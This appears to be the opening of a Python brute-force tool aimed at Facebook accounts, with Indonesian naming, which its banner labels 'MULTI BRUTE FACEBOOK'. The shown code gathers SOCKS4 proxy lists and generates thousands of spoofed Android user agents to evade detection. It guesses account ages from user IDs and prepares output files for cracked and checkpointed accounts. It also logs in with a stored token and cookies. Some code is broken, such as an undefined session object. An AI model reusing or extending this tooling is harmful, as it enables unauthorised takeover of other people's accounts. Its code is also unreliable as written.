
###----------[ IMPORT MODULE ]----------###
import requests,json,os,sys,random,datetime,base64,time,re,platform,rich
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from time import time as TimeTegar
from rich.tree import Tree
from rich import print as prints
from bs4 import BeautifulSoup as parser
hp = platform.platform()

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
xbz,xnxx = [],[]
tokenefb = []
akunyeh = []
usragent = []
tokenku = []
usrgent2 = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
af = 0
ualu,ualuh = [],[]
CON=sol()
ugen = []

###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	print(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[ USER AGENT 1 ]----------###
ugen1 = []
for manXical in range(10000):
    rr = random.randint
    rc = random.choice
    gt = ['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H','TP1A','SKQ1','QP1A','QKQ1','PKQ1','NRD90M','PPR1','TKQ1','MRA58K','MMB29M','SP1A','RP1A','QCOS30','LMY47X','UKQ1','KTU84Q','KTU84P','MBFMIEK','MMB59M','N2G47H','OPM1','LMY47I','GRI40','AN4J','O11019','V0050UU','JZO54K']
    eak = ['zh-cn','zh-tw','en-us','fr-fr','ru-ru','pt-pt','pl-pl','es-es','id-id','it-it']
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
    samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ","G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B","S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]  
    budi = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
    bgzahid = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,20))}; {str(rc(eak))}; {str(rc(oppo))} Build/{str(rc(gt))}.{str(rr(102929,888888))}.0{str(rr(10,25))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(20,200))}.0.{str(rr(1092,9830))}.{str(rr(20,980))} Mobile Safari/537.36 OppoBrowser/{str(rr(1,20))}.{str(rr(0,10))}.{str(rr(0,15))}"
    bgzahid1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,20))}; {str(rc(eak))}; {str(rc(redmi))} Build/{str(rc(gt))}.{str(rr(102929,888888))}.0{str(rr(10,25))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(20,200))}.0.{str(rr(1092,9830))}.{str(rr(20,980))} Mobile Safari/537.36 Chrome/{str(rr(1,20))}.{str(rr(0,10))}.{str(rr(0,15))}"
    bgzahid2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,20))}; {str(rc(eak))}; {str(rc(realme))} Build/{str(rc(gt))}.{str(rr(102929,888888))}.0{str(rr(10,25))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(20,200))}.0.{str(rr(1092,9830))}.{str(rr(20,980))} Mobile Safari/537.36 Chrome/{str(rr(1,20))}.{str(rr(0,10))}.{str(rr(0,15))}"
    bgzahid3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,20))}; {str(rc(eak))}; {str(rc(samsung))} Build/{str(rc(gt))}.{str(rr(102929,888888))}.0{str(rr(10,25))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(20,200))}.0.{str(rr(1092,9830))}.{str(rr(20,980))} Mobile Safari/537.36 Chrome/{str(rr(1,20))}.{str(rr(0,10))}.{str(rr(0,15))}"
    
    bangzahid = random.choice([bgzahid,bgzahid1,bgzahid2,bgzahid3])
    ugen.append(bangzahid)
	
# TAHUN MAJAPAHIT #
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		elif fx[:4] in ['6155']              :tahunz = '2024'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
	
###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m' 
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
asu = random.choice([m, k, h, u, b])
# ------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
afh = 'A2F-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

###----------[ UNTUK ANIMASI ]----------###
def alvino_xy(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


def clear():
    os.system('clear')


def back():
    login()
def baz_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def baz_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
     
###----------[ BANNER MENUH ]----------###
def banner():
	os.system('clear')
	baz_bann(f'''{asu}
┏┓┳┓┏┓┏┓┏┓ ┏┓┏┓┳┓
┃┓┣┫┣ ┣ ┏┛  ┃┃ ┃┃©
┗┛┛┗┗┛┗┛┗┛ ┗┛┗┛┻┛
                  
                  
{asu}MULTI BRUTE FACEBOOK VERSION 3.5 ®
USER : {k}>> {h}[ 1 USER ONLINE ]{k}<<{asu}
AUTHOR : {k}>> {h}[ GREEZ XD ] {k} <<{asu}
WA AUTHOR : {k}>> {h}[ +621231520170 ] {k}<<{asu}
LAST UPDATE..........{x}
''')

#kukis
def login():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		time.sleep(5)
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"{P} [:] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".tok.txt")
		except:pass
		login()
	os.system('clear')
	banner()
